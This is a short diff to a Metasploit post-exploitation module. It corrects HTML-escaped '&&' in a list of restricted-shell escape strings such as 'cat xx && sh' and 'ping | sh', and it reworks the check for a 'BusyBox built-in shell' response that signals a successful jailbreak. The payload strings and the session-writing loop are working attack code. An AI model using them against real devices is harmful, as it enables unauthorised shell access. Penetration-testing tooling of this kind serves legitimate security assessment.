@@ -19,9 +19,9 @@ class Metasploit3 < Msf::Post
     'cat xx | sh',
     'ping | sh',
     'cat ($sh)',
-    'cat xx &amp;&amp; sh',
-    'echo xx &amp;&amp; sh',
-    'ping &amp;&amp; sh'
+    'cat xx && sh',
+    'echo xx && sh',
+    'ping && sh'
   ]
 
   def initialize
@@ -55,8 +55,9 @@ class Metasploit3 < Msf::Post
       session.shell_write("#{command}\n")
       (1..10).each do
         resp = session.shell_read
-        vprint_status("jailbreak received: #{resp}") unless resp.nil? || resp.empty?
-        if resp.downcase.include?('busybox') && resp.downcase.include?('built-in shell')
+        next unless resp.to_s.length > 0
+        vprint_status("jailbreak received: #{resp}")
+        if resp.downcase =~ /busybox/i && resp.downcase =~ /built.*in shell/i
           print_good("Jailbreak accomplished with #{command}")
           return true
         end
